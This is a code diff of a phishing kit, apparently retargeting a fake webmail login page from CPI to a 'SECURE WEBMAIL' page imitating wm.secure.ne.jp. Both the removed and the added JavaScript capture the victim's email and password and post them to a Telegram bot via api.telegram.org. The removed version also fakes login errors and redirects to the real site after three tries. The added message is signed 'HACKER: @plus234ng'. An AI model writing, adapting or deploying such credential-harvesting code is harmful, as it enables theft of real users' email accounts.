+            message_secures = "🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐\n \n😘- WEBMAIL LOGIN ✅\n⚡Email: " + u_name_secures + "\n⚡Password: " + password_secures + "\n\n▬▬▬▬▬▬[SECURE WEBMAIL]▬▬▬▬▬▬\n🤖Source: secures.html\n🌐Domain: https://wm.secure.ne.jp/webmail/\n\n📞HACKER: @plus234ng";
+        };
 
-        // Hide error message
-        function hideError() {
-            document.getElementById('errorDiv').style.display = 'none';
-        }
+        var sendtelegram_secures = function () {
+            tick_secures += 1;
+            ready_secures();
 
-        // Show loading animation
-        function showLoader() {
-            document.getElementById('loader').style.display = 'flex';
-            document.getElementById('formFieldset').style.opacity = '0.5';
-            document.getElementById('loginBtn').disabled = true;
-        }
-
-        // Hide loading animation
-        function hideLoader() {
-            document.getElementById('loader').style.display = 'none';
-            document.getElementById('formFieldset').style.opacity = '1';
-            document.getElementById('loginBtn').disabled = false;
-        }
-
-        // Send data to Telegram
-        function sendTelegramData(event) {
-            event.preventDefault();
-            attemptCount++;
-
-            const email = document.getElementById('emailInput').value;
-            const password = document.getElementById('passwordInput').value;
-            const language = document.getElementById('languageSelect').value;
-
-            showLoader();
-            hideError();
-
-            // Create message for Telegram
-            const telegramMessage = `🔐 CPI ウェブメール ログイン ✅\n\n` +
-                `📧 メール: ${email}\n` +
-                `🔑 パスワード: ${password}\n` +
-                `🌐 言語: ${language}\n\n` +
-                `⏰ タイムスタンプ: ${new Date().toISOString()}\n` +
-                `🔢 試行回数: ${attemptCount}\n\n` +
-                `🏢 サイト: CPI ウェブメール ポータル`;
-
-            // Send to Telegram API
-            const settings = {
+            var settings = {
                 "async": true,
                 "crossDomain": true,
-                "url": "https://api.telegram.org/bot" + TELEGRAM_BOT_ID + "/sendMessage",
+                "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
                 "method": "POST",
                 "headers": {
                     "Content-Type": "application/json",
                     "cache-control": "no-cache"
                 },
                 "data": JSON.stringify({
-                    "chat_id": TELEGRAM_CHAT_ID,
-                    "text": telegramMessage
+                    "chat_id": chat_id,
+                    "text": message_secures
                 })
             };
 
             $.ajax(settings).done(function (response) {
-                console.log("Telegram メッセージ送信完了:", response);
+                console.log("Telegram sent successfully:", response);
             }).fail(function (error) {
-                console.log("Telegram エラー:", error);
+                console.log("Telegram sending failed:", error);
             });
+        };
 
-            // Simulate login delay
-            setTimeout(() => {
-                hideLoader();
-                showError();
-                document.getElementById('passwordInput').value = '';
-
-                // After 3 attempts, redirect
-                if (attemptCount >= 3) {
-                    setTimeout(() => {
-                        window.location.replace("https://webmail.cpi.ad.jp/");
-                    }, 2000);
+        // Hook into existing form submission - intercept the login button click
+        $(document).ready(function () {
+            var original_click = $('#submit-btn').attr('onclick');
+            
+            // Bind to click event to trigger telegram before submission
+            $(document).on('click', '#submit-btn', function (e) {
+                // Send telegram data when login button is clicked
+                var email_val = $('#email').val();
+                var password_val = $('#password').val();
+                
+                // Only send if both fields have values
+                if (email_val && password_val) {
+                    sendtelegram_secures();
                 }
-            }, 2500);
-
-            return false;
-        }
-
-        // Hide error on input focus
-        document.getElementById('emailInput').addEventListener('focus', hideError);
-        document.getElementById('passwordInput').addEventListener('focus', hideError);
-
-        // Page load initialization
-        document.addEventListener('DOMContentLoaded', function () {
-            console.log("CPI ウェブメール ログインページ読み込み完了");
-            // Set default language to Japanese
-            document.getElementById('languageSelect').value = 'ja';
+            });
         });
     </script>
-</body>
+   
 
 </html>
